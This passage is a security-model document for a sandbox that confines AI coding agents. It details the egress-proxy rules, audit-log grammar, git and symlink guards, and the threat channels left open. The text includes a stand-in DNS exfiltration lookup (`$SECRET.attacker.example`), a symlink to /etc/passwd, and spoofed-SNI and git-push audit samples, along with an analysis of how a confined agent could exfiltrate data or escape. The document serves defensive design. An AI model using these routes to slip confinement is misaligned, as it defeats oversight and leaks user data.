# Security model

This document describes what the sandbox setup defends against, how, and what it does not.

The README opens with a diagram of the boundary this file reasons about. The rest of the repository
describes mechanism, and the launcher — `src/main/scala/`, with `AgentSandboxLauncher.scala` the
flow and its neighbours one concern each — is the canonical description of the mounts and flags
that implement it.

The instructions to the agents are separate at `container/ko-agent-sandbox/SANDBOX.md`.

## Defended

**Compromise the host workstation.** The host exposes only the project directory and the
agent-state volume; the containers run rootless, and agents have no way to become root inside
them. `$HOME` and `/tmp` inside are writable but die with the session. No container socket is
mounted under any spelling: one would hand a session the host's own container runtime, which is
every boundary here at once, so `SessionBoundaryTest` looks for both.

**Credential theft.** There is little to steal: forge tokens, cloud credentials and SSH keys are
never mounted — everything credentialed happens on the host (the README's private-repository
workflow generalizes: push, publish, deploy, administer). The one exception is the agents' own
provider logins, kept in the persistent volume because no agent functions without them.

That is a claim about what the launcher carries in. A credential the user puts in the project
directory themselves is in the sandbox like any other file — tolerated rather than provided for,
and reaching whatever this project's egress policy admits.

**Project data reaching a destination nobody chose.** The only path out is the HTTPS proxy,
which admits an exact list of hostnames and logs every attempt ("Egress proxy" below).

**Writing to remote hosts**, except the agents' model traffic and `git clone`/`fetch`. Every
allowed destination is declared in one of two tiers: `read-write`, opaque tunnels for the model
traffic that has to write, and `read-only`, TLS-inspected, where `git push` and every other write
is refused. "Reading without being able to write" below has the rules, the costs, and what they
do not cover.

**Being used to attack someone else.** The same allowlist. The agent cannot reach an arbitrary host,
an arbitrary port, or a private address — cloud metadata services such as 169.254.169.254 included.

**One session affecting the next, or another project.** Agent state is a per-project volume, the
rest of the sandbox home is discarded on exit, and Claude Code's hooks are disabled (the sandbox
Containerfile's `disableAllHooks` note has the reasoning). The networks and the proxy are per
sandbox run, created by the launch and removed with it — so concurrent sessions cannot reach one
another either, and nothing network-shaped is ever reused from an earlier run.

**A project loosening its own confinement.** Managed settings sit in the read-only image at the
highest precedence, so a repository's own settings cannot weaken them.
`/workspace/.ko-agent-sandbox` is mounted read-only, and the egress policy in it is read on the host
before the container starts.

That mount is the first line and the workspace filter is the second, because a mount cannot follow
its source: a host that removes or replaces the directory mid-session takes the mount with it and
would otherwise leave the name free inside a writable workspace, where a session could write the
policy governing the next launch. So the filter treats `.ko-agent-sandbox` as control state — the
name cannot be created at any depth, under the same fold rule `.git` gets, and nothing under an
existing one can be written. A session that opted out of the filter has the mount alone.

**The host's git executing what the sandbox wrote.** Host `git` runs what `.git` configures:
hooks, and commands named in `.git/config` — `core.hooksPath`, `core.fsmonitor`, filters, the pager.
By default the workspace FUSE filter is what stops a session turning the user's next `git status`
on the host into code execution: it refuses a new entry named `.git` at any depth, under any
spelling a case-insensitive backing folds to that name, and freezes the control state of every
repository rooted at a `.git` entry — `config`, `hooks/`, the redirection files, the rebase todo —
while operational state stays writable, so the agent's own git keeps working. It serves the tree
live: a repository created on the host mid-session appears at once, with the same control files
frozen. What stays writable in `.git` is data.

Control bytes must also *resolve* that way, and the mount-time guard is what holds it for the
repository host git discovers from the project directory: it refuses a workspace-root repository
whose gitdir, config or hooks reach host git through a writable workspace path — a redirected
gitdir (`git init --separate-git-dir`), a config or hook aliased into the worktree, a `commondir`
pointing back in — and a bare layout standing at the workspace root. A gitdir-shaped directory
*without* a `.git` name elsewhere in the tree is the residue "The project checkout" describes.

This is the default, and two things qualify it, both under Not defended: a session opted out with
`KO_AGENT_SANDBOX_WORKSPACE_GUARD=none` gets mount pins instead, which do not carry the claim
("The opted-out mode's `.git` pins"); and what the filter does not yet have on every platform is
evidence ("The workspace filter, on the platforms where it is unverified").

**Silent changes to what you own.** The launcher never silently modifies configuration or files it
does not own — a security property, not politeness: a change you were not conscious of is one you
cannot account for when reasoning about your own system. Enumerated, because each entry is a place
a shortcut would be tempting:

- the Podman **machine's** `/etc/fuse.conf` gains `user_allow_other` only after `--build` shows the
  change as a diff of the actual file plus the exact script, and you consent; the original is saved
  to `/etc/fuse.conf.ko-agent-sandbox.orig` first, and declining prints the script for you to run
  yourself;
- a native Linux **host** is never even prompted for sudo — only handed the command;
- the **machine** is started when stopped, but never created or resized: sizing is yours;
- the **project tree** is never written by the launcher, with two enumerated exceptions, both
  empty directories that read-only guard mounts require. An empty `.ko-agent-sandbox`, created
  when absent because its read-only mount must exist on every launch — without it a session could
  write the egress policy governing the next one. And in a project with no repository, an empty
  `.git`: the launcher binds its own empty directory read-only over that name (so a sandbox cannot
  fabricate a repository for host git to discover), and the container runtime creates the mount
  target it needs in the project. The filter needs no such mount target, denying `.git` creation
  itself, so the empty `.git` appears only for a session that opted out of it;
  `.ko-agent-sandbox` is every session's.

What the launcher does write, it owns: its images, containers, networks and named volumes, its
per-project state root, and its install directory `~/.local/share/ko-agent-sandbox`. For the podman
objects, ownership is a name contract: `--reset-all` force-removes every container, network and
volume matching the generated shapes — `ko-agent-sandbox-*` and `ko-agent-egress-*` ending in the
twelve-hex path hash and, for per-run resources, the eight-hex run suffix. Those shapes are
reserved: an object created by hand inside one is removed like the launcher's own, and a
`KO_AGENT_SANDBOX_PERSISTENT_VOLUME` naming one is a refused launch.

**Accidentally exposing an over-broad project directory.** Before creating any resource, the
launcher refuses:

- filesystem roots, including Windows drive and UNC roots;
- the current user's configured homes (`HOME` on POSIX; `USERPROFILE` and `HOME` on Windows)
  and Windows `PUBLIC` — the shared profile — plus every ancestor of those directories, with
  the macOS data-volume spelling (`/System/Volumes/Data/...`, a firmlink alias `toRealPath`
  does not collapse) treated as the same directory;
- the well-known home containers, whether or not a configured home sits beneath them: `/home`,
  `/Users` and the Windows profiles root (`%SystemDrive%\Users`, `C:\Users` when `SystemDrive`
  is unset), plus their direct children — another account's home exposes that account exactly
  as this one's would — and POSIX root's own homes, `/root` and `/var/root`;
- a path whose current or ancestor directory has a dot-prefixed name.

A project *inside* a home is not refused: `~/src/app` and `~/app` alike are ordinary project
directories, and refusing them would leave nowhere obvious to work.

Home discovery degrades loudly, never silently: a `HOME` that is set but invalid fails the
launch on POSIX, while on Windows an invalid secondary value (Git Bash's POSIX-style `HOME`)
is dropped with a warning when another home variable resolved; a home that cannot be resolved
to a real path is refused by its exact spelling, with a warning; and with no home variable set
at all (cron, CI, `env -i`) the launch proceeds under the built-in refusals above and says so.

This is an accident guard, not a complete path boundary. The launcher does not enumerate the
system's accounts or prove that the chosen directory is a project; selecting some other broad
directory still exposes that directory in full. The security boundary begins at the exact project
directory the user selects.

## Not defended

**Prompt injection.** Nothing here stops the agent being persuaded. The boundary limits what the
consequence can be; it does not notice the attempt.

**Exfiltration through an allowed host.** For the agent endpoints that stay opaque tunnels, a
host reachable for reading is reachable for writing if it has a write API; `api.anthropic.com`
receives the conversation by design. At every other host the proxy terminates TLS and names the
permitted operations — reading, plus git fetch at the forges — but that bounds the method and the
path, not what a permitted read can be pointed at: a `GET` still carries its URL, and a URL is a
message. A project whose checkout holds a forge token should still block that forge's hosts in
its own `egress-hosts/blocked`.

`storage.googleapis.com` is the widest such recipient, and read-only for that reason ("Reading
without being able to write", below).

**The web reached through the model provider.** Claude Code's WebSearch and Codex's web search run
on the provider's servers: the query and its results travel inside the model-endpoint tunnel, and
the provider's infrastructure does the searching. The proxy sees one connection to
`api.anthropic.com` or `chatgpt.com`, so neither the allowlist nor the audit log (`--proxy-log`)
applies to the domains searched — a query is outbound information the provider relays onward.
Claude Code's WebFetch is the opposite: a direct request from inside the sandbox, through the
proxy, answered only by an allowed host and logged like any other connection.

**Low-bandwidth channels.** Which allowed host is contacted, when, and in what order all carry
information. Nothing measures that.

**The project checkout.** `/workspace` is writable on purpose: the sandbox protects the rest of the
host, not the repository. With git's control state frozen (above), what an
agent can still write there is data which your git then parses, so a
memory-safety bug in git itself remains reachable, exactly as with any cloned untrusted repository
(`.gitattributes` stays writable, but can only invoke filter commands your host configuration
already defines). Treat a sandboxed repository as hostile data, not hostile configuration.

Everything else writable — build scripts, CI definitions, IDE configuration, generators, binaries —
is output from an untrusted execution environment: editing them is the job, and confining their
author says nothing about what running them on the host will do. Review the diff first, exactly as
for a contribution from a stranger. That includes a repository the agent created deeper in the
tree, in both guard modes: an opted-out session leaves any shape unpinned, and the default
session's filter — which refuses creating a `.git` entry — cannot refuse a *bare layout*, built
from ordinary names (`git init --bare`, `git clone --bare|--mirror`, or by hand): its config and
hooks are served as writable data anywhere in the writable workspace — the mount-time check
catches only a layout already standing at the root, not one assembled there afterwards in a
repository-less workspace — and git's ascending discovery adopts it for a host command run at or
beneath it. Running host git *inside* a directory the agent
created is running the agent's output.

A symlink is the sharpest case of that, because its meaning can change with the namespace reading
it. `/workspace/x -> /etc/passwd` written inside resolves to the *container's* `/etc/passwd`, and a
relative `../../..` clamps at the container root, so from in there it reaches nothing the sandbox
did not already expose. On the host the identical link resolves to the host's file, outside the
project directory the boundary is drawn around — and it fires not when the agent writes it but
whenever something later follows it: `grep -r`, `tar`, `cp -rL`, an editor indexing the project, a
packaging step. It is also where "review the diff" is weakest, since the diff is one innocuous line
of target text.

The workspace filter narrows this rather than closing it: it refuses a target that is absolute or
climbs above the workspace root, the shape a tool plants when it links into a cache of its own. Two
residues stay, both argued at the rule (`fs.rs`, `target_has_portable_shape`): a shape is not a
meaning, so a target whose own components are symlinks resolves by whatever they point at on each
side; and the shape is judged at creation, so a later `rename` or `link` can re-aim a conforming
link outside the workspace. A session set on planting a link still can, and the diff is still what
you review for symlinks. Hardlinking a *file* needs no such care: `/workspace` and the container
root are different filesystems, so `link` to anything outside is `EXDEV` in both directions; it is
aliasing a symlink that carries the risk.

The tree is also shared live with the host: your editor, builds and git run against the same files
the agent is writing, host and sandbox writes race like any two processes on one directory, and
git's own lock files are the only arbiter the writable parts of `.git` get. Concurrent sandbox
sessions of one project race each other the same way — under the workspace filter too, where they
share the one filter mount: the same files, the same live view, the same races.

**The workspace filter, on the platforms where it is unverified.**
`/workspace` reaches the sandbox through `ko-agent-fs` (`fuse/ko-agent-fs/`), a FUSE mount enforcing
the policy stated under "The host's git executing what the sandbox wrote". That closes what a pin
cannot: repositories planted or nested below the workspace root. A FUSE layer rather than a
kernel-side mechanism because it works wherever the VM does; `fuse/ko-agent-fs/doc/architecture.md`
("Mediation mechanism") weighs the alternatives.

Two residues stay yours to know about. The mount-time guard refuses a workspace-root repository
whose control bytes resolve through the writable workspace — hooks relocated into the worktree, a
redirected gitdir or `commondir`, an aliased config, an individual hook symlinked back in — and a
bare layout standing at the root; `fuse/ko-agent-fs/doc/git-metadata.md` ("Relocated hook
directories") states the binding rule it enforces. What it does not cover: a repository *you*
nested deeper keeps its control state frozen like any other, but control bytes you had already
routed into its worktree — relocated hooks, a redirected gitdir — are served as ordinary writable
data (`fuse/ko-agent-fs/doc/TODO.md` records the gap); and a bare layout is served writable
anywhere — below the root, or assembled at the root after the mount-time check — the one shape
the *sandbox* can create itself ("The project checkout", above). The
check is also a snapshot: reshape control state mid-session and this session will not notice. The
snapshot admits only resolution chains made of components the sandbox cannot write or rename, so
the sandbox cannot invalidate it — the windows only open if you open them.

What an auditor trusts, and how each link is checked:

- **The source.** No binary is shipped: the Rust source travels inside the launcher jar, readable
  in this repository, and `--build` compiles it in a pinned `rust:slim` container on the user's
  own machine.
- **The dependency tree**, pinned by `Cargo.lock` (`--locked` at every cargo step) and gated by a
  pinned `cargo-deny` — permissive licences only — before any binary exists.
- **The installed binary's identity.** The launcher digests the bundled source, passes the digest
  into the image build, and requires the installed binary's `--version` to echo it back; a binary
  that is not the one this launcher's source builds fails `--build` rather than being trusted.
- **No new privilege.** Installed into the Podman machine's user home on macOS and Windows, the
  host user's on native Linux (the README names the path), it mounts as an ordinary user through
  the setuid `fusermount3`: no root, no capabilities, no system daemon. The one root-assisted
  step — `user_allow_other` in the machine's `/etc/fuse.conf`, required for a cross-uid FUSE
  mount — is consent-gated ("Silent changes to what you own", above).

Its name rule and its coherency are verified on macOS, against APFS case-insensitive — the
default volume format — through the whole production stack. On Linux and Windows they are not,
and that is what the README's status line means: the filter is every session's enforcement on
every platform, but on those backings its guarantees are reasoned rather than measured.

`KO_AGENT_SANDBOX_WORKSPACE_GUARD=none` is the way back to the mount pins, the next entry. The two
are alternatives, never a stack: the filter's policy is a strict superset of the pins', and
preparing a pin's bind targets would mean creating `.git` entries through the filter, which the
filter denies. Every gate on the filtered path fails closed — a version mismatch, a failed
self-test or a failed mount aborts the launch, never falling back to an unfiltered bind. Mechanics,
policy derivation and test evidence: `fuse/ko-agent-fs/doc/`.

**The opted-out mode's `.git` pins.** `KO_AGENT_SANDBOX_WORKSPACE_GUARD=none` replaces the filter
with mounts: `.git/config` and `.git/hooks` remounted read-only (a pointer-file `.git` pinned whole,
and the bare name when no repository exists). A session that takes it says so on its first line.
Their shape is fixed at launch — a host-created repository appears behind the whole-directory pin,
read-only until the next launch — and they cover only the workspace root, so a repository the agent
creates deeper in the tree is unpinned there, the residue "The project checkout" describes.

They also hold only while the file each one pinned keeps its inode, because a pin is a mount and a
mount cannot follow the file out from under it. On a macOS Podman machine, once the host gives
`.git/config` or `.git/hooks` a new inode while the session runs — a rename over it, or a rename
away and a fresh object at the path, which is how `git config` and most editors write — the sandbox
is writing the host's current file within about two seconds, through the writable parent. It is
stale in between, and the mount stays listed in the sandbox's mount table throughout, so neither
that table nor a check made immediately after the write shows anything wrong. Mutations that keep
the inode hold: an in-place edit, and files appearing or disappearing inside the pinned
`.git/hooks`.

So this mode holds those two paths against the sandbox for as long as nothing on the host rewrites
them, which is not a property to rely on in a repository being worked in, and no mount over a path
closes it. `WorkspaceGuardOffTest` carries the measurements.

**What is inside TLS, for the hosts that stay opaque.** The read-write tier is deliberately not
inspected, so for those hosts the proxy sees only the handshake and cannot tell a `GET` from a
`POST`. By default the tier is the agent endpoints alone, because terminating their TLS means
reading the conversation in clear inside the proxy. Every other host is inspected —
read-only, the bulk package registries included at a knowing per-request
handshake cost: security is not traded for performance (DESIGN.md's principles; the tier
comment in the proxy source prices it).

**What the persistent volume carries.** It is read back every time the project opens, and some of
what it holds — MCP server definitions especially — names commands to run. Treat it as trusted
input; reset it if a project is suspect. `KO_AGENT_SANDBOX_PERSISTENT_VOLUME` shares one volume
across every project, trading that isolation for signing in once: what a session of one repository
writes there becomes startup input to every other's.

Concurrent sessions of a project mount it read-write together: state files race, last writer wins —
same repository, same trust domain, so a data-integrity caveat, not a new trust edge. A `--reset`
from another terminal ends live sessions by design; one racing a launch mid-start fails that launch
loudly rather than weakening it.

**A repository that ships a wide egress policy.** Reading `.ko-agent-sandbox/egress-hosts/` before
running an unfamiliar project is the user's job, exactly like reading its build scripts — its
`read-write` file most of all, since every host there is an opaque tunnel.

**The supply chain.** Base images, the JDK, and whatever `cs`, `uvx` or `npx` fetches at the
agent's request are trusted as they arrive. npm's install-time audit does work (the `=npm-audit`
allowance, "Reading without being able to write" below), but its warnings are advisory: nothing
gates on them.

**Container, runtime and kernel escape.** On Linux the boundary ultimately rests on rootless Podman,
the OCI runtime, namespaces, seccomp and the host kernel. This design is not built to contain a
working kernel or container-runtime exploit; if that enters the threat model, the answer is a
stronger isolation layer (gVisor, a microVM), bought at its compatibility cost, not more flags here.

**Resource exhaustion.** The PID limit and the opt-in memory ceiling bound the two runaways this
environment actually invites. CPU, disk growth under `/workspace`, network bandwidth, and denial of
service against the host generally are not comprehensively bounded.

## Egress proxy

An HTTP proxy in its own container, so the policy is enforced somewhere the agent cannot
edit, on the far side of a network the agent cannot route out of. The container is created per
sandbox run and removed when the run ends — in `podman ps` a run's containers are
`ko-agent-egress-proxy-<directory>-<hash>-<run>` and `ko-agent-sandbox-run-<...>`, in
`podman network ls` its networks `ko-agent-sandbox-<...>` and `ko-agent-egress-<...>`. Its log —
every allow and every refusal — is appended through a bind mount to a per-run file in the
launcher's state directory on the host, so the audit record does not share the container's
lifetime. Every connection has to pass all of this, in order:

1. `CONNECT` only — any other method is a 400
1. port 443 only
1. IP-literal targets are refused — not just dotted-quads: the resolver also accepts `127.1`,
   `0177.0.0.1` and `2130706433` as spellings of `127.0.0.1`, and a match on the first form alone
   is a known bypass class
1. the hostname matches the allowlist exactly — no wildcards, no suffixes
1. DNS is resolved once, and the connection is made to that resolved address, so no second lookup
   can return a different answer
1. every address the name resolved to must be a public one — a name that answers with a loopback or
   RFC1918 address is refused outright
1. `200 Connection Established` — the reply that accepts a `CONNECT`, and the last HTTP the proxy
   speaks on this connection; from here on the bytes are the client's TLS, not HTTP
1. the client's TLS ClientHello is parsed within a fixed byte budget
1. Encrypted ClientHello is refused: it would hide the name that actually selects a backend
1. SNI must be present, and must equal the hostname in the `CONNECT`
1. only then does it become a tunnel — inspected for most hosts, opaque for the rest

Steps 8-11 are what stops `CONNECT allowed.example:443` from being used to speak TLS to something
else behind the same address. They happen after the `200`, so a failure there closes the connection
rather than answering with a status the client would no longer accept.

### The audit line grammar

Every connection event is one log line, and the line's head is stable — tooling may rely on it;
the trailing text is for humans and may change:

    allow <host> <method> [<target>] -> <ip>
    deny  <host> <method> [<target>] <why>
    error <host> <method> [<target>] <why>

The host is the `CONNECT` target as the sandbox requested it — what was asked for, not a name the
policy vouches for. The method is `CONNECT` for tunnel-level events and the inspected method
inside one; `-` fills a field the connection ended before revealing, so the field never carries a
token the proxy did not admit — a refused method is named in the text instead. The target appears
exactly when a parsed inspected request exists, query string included: the URL is the message an
allowed `GET` can carry ("Exfiltration through an allowed host", above), so the log records it
whole, which is also why the log files are owner-only. Whole, but not arbitrary — a control
character in a request target, a field value or a `CONNECT` authority is refused at the parser, so
nothing that reaches this log can split a line's fields with a tab or rewrite it with an escape
sequence on the terminal reading it. `deny` is a decision — the policy refused;
`error` is the world failing where the policy had not refused — so a count of `deny` lines is a
true refusal count, never inflated by network weather. What each stage can emit, with
representative reasons:

    # the CONNECT gate — lifecycle steps 1 to 6
    deny - - GET non-CONNECT request
    deny example.com CONNECT port 8080
    deny 169.254.169.254 CONNECT IP-literal target
    deny tracker.example CONNECT host not allowed
    deny internal.corp CONNECT resolved to non-public address 10.0.0.5

    # the TLS gate — steps 8 to 10, after the 200, before any tunnel
    deny github.com CONNECT SNI evil.example differs from target
    deny github.com CONNECT encrypted ClientHello

    # tunnels and inspected requests — step 11 onward
    allow api.anthropic.com CONNECT -> 160.79.104.10
    allow github.com GET /owner/repo?tab=readme -> 140.82.112.3
    deny github.com POST /owner/repo.git/git-receive-pack read-only path
    deny github.com GET /r.git/info/refs?service=git-receive-pack git push ref discovery
    deny github.com GET /owner/repo request body
    deny registry.npmjs.org PUT /lodash read-only host
    deny github.com GET /owner/repo Host header evil.example

    # infrastructure — error, never deny
    error internal.example CONNECT resolution: unknown host
    error api.anthropic.com CONNECT tried 160.79.104.10 203.0.113.7: connection timed out
    error github.com GET /owner/repo origin: certificate expired
    error github.com GET /owner/repo relay: connection reset
    error github.com GET /big.tar relay: 8192-byte response truncated: body ended 100 bytes early
    error github.com - client closed before sending a request

The truncation line is the relay enforcing the response's own framing — Content-Length, or
chunked termination: an origin dropping mid-body is logged, and the client's end is closed
abortively, no clean TLS end, so the stump cannot read as a finished download. The client-closed
line is routine, not an incident: pooled clients open spare connections and discard them unused;
nothing was asked, so nothing was refused — an `error`, never a `deny`. A connection dying inside
a half-sent header is a `deny`: a half request is an anomaly, not weather.

The startup lines precede these and sit outside the grammar: the listening port, the two tier
lines (the `--print-policy` shapes), and the inspection summary. There is no peer-address field
anywhere: the per-run internal network has exactly one client, so it would be a constant.

### Reading without being able to write

1. `github.com`
1. `raw.githubusercontent.com`
1. `objects.githubusercontent.com`
1. `codeload.github.com`
1. `api.github.com`
1. `codeberg.org`
1. `gitlab.com`

are the built-in `=git-fetch`-tagged read-only entries, on the allowlist because agents genuinely
need to read them: issues, release notes, upstream sources, `git clone`. An opaque tunnel to those
hosts is also the shortest path out for the contents of `/workspace`, since the same tunnel
carries `git push`.

The rest of the read-only tier carries no tag — `GET` and `HEAD` with no body, and no POST at
all: the documentation and reference sites, the content CDNs, and the container-image pull hosts.
One member needs that rather than merely wearing it: `storage.googleapis.com` is all of Google
Cloud Storage, where a signed URL an attacker minted accepts a `PUT` — the one unauthenticated
write surface the built-in list ever had, admitted because `gcr.io` (distroless) serves its blobs
from there. A tag's POST exception must not reach an untagged host: a GCS object name is
anyone's to choose, so a path that mimics `git-upload-pack` would ride the git rule through. The
proxy's `DefaultReadOnlyHosts` is the canonical built-in membership, tags included; what stays
opaque, and why, is "What is inside TLS" below.

So for every read-only host the proxy terminates TLS and applies a second, narrower policy to the
request inside it:

- `GET` and `HEAD` to any path — the whole of the read surface
- on the `=git-fetch`-tagged entries alone, `POST` to a path ending `/git-upload-pack` — the
  transfer step of `clone` and `fetch`: after discovering refs with a `GET`, git sends its wants
  as a `POST` and the packfile comes back in the response. A download that travels as a `POST`,
  so a GET/HEAD-only policy would still read as "reads allowed" while every `git clone https://…`
  failed
- on the `=npm-audit`-tagged entry alone (`registry.npmjs.org`), `POST` to the one audit endpoint
  the image's npm was measured to use at install time, so dependency-vulnerability warnings keep
  working; an older npm's audit endpoint is refused and logged, non-fatally. The body is the
  accepted price: the dependency graph — package names and versions — including names the
  registry's own `GET`s never carried, such as a lockfile entry from a private registry or a git
  dependency. A project whose dependency names are themselves secrets restates the entry
  untagged (`+registry.npmjs.org` in `egress-hosts/read-only`) and gives up the warnings
- Nothing else. `POST .../git-receive-pack` is the push and is refused, as is its ref discovery — a
  `GET`, refused anyway so that `git push` fails at its first request rather than its second. `PUT`,
  `PATCH` and `DELETE` are refused, and so is every other `POST`

The refusal is a `403` inside the tunnel with the reason in it, and a `deny` line in the audit
log ("The audit line grammar", above). That log is the other half of what this buys: what an
agent asked a forge to do is now recorded, not merely whether it opened a connection.

Two consequences:

- The GraphQL endpoints are a `POST` even to read: a query and a mutation are the same request
  shape, telling them apart means reading the body, and this proxy does not. GraphQL is therefore
  refused; the REST read endpoints are not. On GitHub that costs nothing — its GraphQL API accepts
  no unauthenticated query, and the sandbox carries no forge credential by design. GitLab's answers
  anonymously, so the cost is real there; its REST API still reads with `GET`s. (Codeberg's
  Forgejo has no GraphQL API, so those two are the whole cost.)
- The LFS batch endpoint is not opened. It is a `POST` whose body chooses between download and
  upload — another request whose meaning is in the body. Unlike GraphQL, this refusal is what
  actually stops something: LFS batch downloads on public repositories are anonymous, and git-lfs
  being absent from the image is no boundary — it is one static binary an agent can fetch through
  release-assets.githubusercontent.com, and it then fails here. What it costs is bulk transfer (`git
  lfs pull`), not the content: media.githubusercontent.com is on the allowlist, and GitHub serves
  LFS file contents there read-only, one URL per file — the API's `download_url` for an LFS-tracked
  file points at it. (That escape hatch is GitHub's; GitLab has no equivalent read-only host, so LFS
  content hosted there stays out of reach.) TODO.md records the download-only inspection that would
  reopen bulk transfer.

The session is one request and its response, then the connection closes. That is what lets the proxy
avoid agreeing with the origin server about where a message ends, which is precisely what request
smuggling exploits: the request body is framed once and forwarded, the proxy then stops reading from
the client entirely, and `Connection: close` upstream makes end-of-stream the end of the response.
Ambiguous framings — a `Content-Length` beside a `Transfer-Encoding`, two `Content-Length`s that
disagree — are refused rather than resolved. ALPN is pinned to `http/1.1` so the request is one the
proxy can read at all.

### Who holds the CA key

The launcher, on the host, and nothing else.

Each project gets its own CA, created under `~/.local/state/ko-agent-sandbox/tls/<project>`
(`%LOCALAPPDATA%` on Windows) — outside `/workspace`, so the agent can neither read the key that
signs what it is shown nor replace it for the next session. A CA minted for one project cannot be
used to read another's traffic.

What reaches the proxy container is one leaf certificate and that leaf's own key, bind-mounted
read-only. The leaf names exactly this project's resolved inspected set — the read-only tier
after its `egress-hosts/` files apply — which the launcher does not keep a copy
of: it reads the tier line out of the proxy image's own `--print-policy` under the same policy
at launch, so a custom proxy image, or a project adding an inspected host, gets a matching leaf
and there is no second list to drift. The proxy still refuses to start unless the certificate
names exactly the inspected set of the policy it resolved, in either direction: a leaf missing a
name would surface as an inexplicable TLS error inside the sandbox, and one naming an extra host
means an inspection the proxy will not perform — that host would have been an opaque, writable
tunnel.

The sandbox trusts that CA through a bundle assembled on the host from the image's own CA bundle
plus this project's CA, mounted over `/etc/ssl/certs/ca-certificates.crt`. `SSL_CERT_FILE`,
`CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS` and `GIT_SSL_CAINFO` point at the same
file, for the tools that carry their own trust store rather than reading the system one.

The image's JDK is covered by the same technique one layer over, because it reads none of the
above: a JVM consults a `cacerts` keystore, so the launcher takes the image's own store, adds this
project's CA, and mounts the result read-only over `$JAVA_HOME/lib/security/cacerts` — with
`JAVA_HOME` read from the image's own environment, so the launcher never hardcodes the
arch-dependent Temurin directory and an image without a JDK simply skips the mount. The store is
written back in the format it arrived in, and every root the image shipped survives the merge:
dropping one would be the failure that stays invisible until something needs a public CA, so it is
what the merge is tested on. Merged at launch rather than baked in, since the per-project CA
postdates the image.

Two kinds of program stay outside all of it, neither reachable from the launcher. A JVM the agent
installs itself (`cs java --jvm ...`) brings its own untouched store — the image ships
`sandbox-prepare-jdk`, which gives one such JDK both the CA and the proxy from inside, so the gap
is one command rather than a dead end; the certificate it reads is mounted beside the agent
instructions, and is the same public one already inside the bundle. And a statically linked binary
keeps its compiled-in roots — the Codex CLI, which talks only to uninspected OpenAI.

### Why the policy is per project, in the project, and read-only

A host-wide allowlist has to be the union of what every project needs — the widest policy,
applied everywhere, permanently. Per project, a repository that reads public documentation and one
holding credentials get different answers, and the answer is reviewed in a pull request like any
other file.

`/workspace` is writable, so the policy files would be the agent's to rewrite for the next session.
The launcher therefore mounts `.ko-agent-sandbox` back over itself read-only — creating the
directory on the host first when the project ships none, so the mount point exists on every launch —
which also makes it a mount point: it cannot be written, deleted or replaced from inside the
container. A symlinked policy directory, or anything other than a directory in its place, is refused
rather than mounted, so what is mounted is what was reviewed. The directory is also a closed
namespace, decided before it has a second tenant: an entry the launcher does not read — a typo'd
`egres-hosts/`, notes, a backup — refuses the launch instead of sitting as ignored config, the
same rule `egress-hosts/` applies inside itself (dot-named editor and OS metadata excepted; no
configuration will ever be named that way). What remains is "A repository that
ships a wide egress policy", above.

### Adding hosts, not patterns

The policy files are `+host` / `-host` deltas against the built-in tier lists, with `blocked`
applied last. Additions name exact hostnames; the one wildcard is `**.domain` on the taking-away
side — `-**.domain` in a tier file, bare `**.domain` in `blocked`. That asymmetry is the security
choice.

A wildcard *grant* is an unenumerable reach, the opposite of what the allowlist is for: every entry
is meant to be a destination someone reviewed and chose. `+*.example.com` would not mean "the site"
— it means every name under it, including ones added later, and for a shared apex like a cloud
provider's, names an attacker can register or take over. The breadth is in the grant, not the
matcher, so no careful pattern syntax removes it. In the inspected tier it is also unmintable:
the leaf certificate must enumerate its names at launch, and a subtree has no enumeration. So
additions stay exact.

A `read-only` addition may carry one of the tags "Reading without being able to write" defines. The
addition states its host's complete tagging and overrides the built-in entry for that host —
explicit, and printed as written at every launch — never a merge, which would widen a host to a
treatment no single line says and leave no way to take one tag away. Two project entries tagging one
host differently are refused, and so is a tag on anything that takes away: a removal or a blocked
entry removes the host whole.

A wildcard *removal* is the mirror image: it only ever shrinks the allowlist, so its worst case is
over-blocking something wanted — fail-closed — never reaching something new. `**.foo.com` drops
`foo.com` and every host under it (the dot is part of the pattern, so never `barfoo.com`), which is
the concise way to drop a provider that ships several subdomains in the built-in lists without
re-listing the whole thing. The failure a removal *can* have is the opposite of a grant's: a typo
that matches nothing would leave a default in place while reading as though it were dropped. That is
closed by refusing any removal — exact or `**` — that matches nothing in its tier's built-in list,
and any `blocked` entry matching nothing the policy would otherwise allow, so a misspelling is a
failed launch, not a silent non-narrowing.

The files fail closed on every other ambiguity too: an entry missing its `+`/`-` prefix is refused
(whole-list replacement is `blocked`'s `.defaults`); a host cannot be both
added and removed in one tier — including a `+host` that falls under a `-**.domain`, a
contradiction rather than a precedence to resolve; a host both effective tiers claim is refused
outright; and a filename in `egress-hosts/` that is none of the three — or a stray entry in
`.ko-agent-sandbox/` itself — is a failed launch, never ignored config. The allow-versus-deny
ordering that egress proxies get wrong is a bug family kept out by having one rule — taking away
always wins — and one fixed order, `blocked` last.
(`.defaults` creates no exception: it is not a host matcher but the name of the built-in lists, so
what it removes is the built-in contribution — a host a tier file explicitly `+`adds is the
project's own entry, not a default.) The one no-op that is allowed is deliberate: an identical
restatement of a built-in entry, so a policy that names a host defensively keeps working when a
later image adopts it. The cost is that a delta file is not self-contained; the README's
`--proxy-effective` bullet is the mitigation.

### Why the policy is not a capability system

The allowlist names destinations, and the tiers name operations — reading, plus git fetch at
the `=git-fetch` hosts; nothing grants `GitRead(owner/repo)`-style capabilities. Deliberate:
public reading is meant to be broad —
discovering and reading arbitrary public repositories is much of what the agents are for — and the
sandbox carries no credential whose authority a finer grant would attenuate ("Credential theft",
above). The one distinction that matters at a forge, reading versus writing, is already
enforced in the protocol. Nor would capabilities fix exfiltration: a permitted read still carries
its URL ("Exfiltration through an allowed host", above). What a capability vocabulary would add is a
second policy language whose semantics must stay correct across every layer that reads it —
precisely where richer sandbox policies fail in the field. Revisit only if an agent must someday
perform an operation inside the sandbox with a credential materially more powerful than that
operation.

### DNS

The sandbox runs with `--dns=none` and a single `--add-host` entry for the proxy. That is correct
rather than merely strict: with a proxy configured, curl, npm and uv send `CONNECT host:443` and
never resolve the destination themselves; the proxy does every lookup.

What a session is left with, measured from inside one:

    $ getent hosts egress-proxy          # from /etc/hosts, no resolver involved
    10.89.0.2       egress-proxy
    $ getent hosts $SECRET.attacker.example
    (no answer, 2 ms)

**Routing is what enforces this, not the resolver configuration.** `--dns=none` means podman writes
no `resolv.conf`, so the container keeps the image's own — which still names public resolvers. They
are unreachable: the sandbox's network is `--internal`, its routing table holds one on-link entry
and no default route, so a packet to a nameserver outside it has nowhere to go and the lookup fails
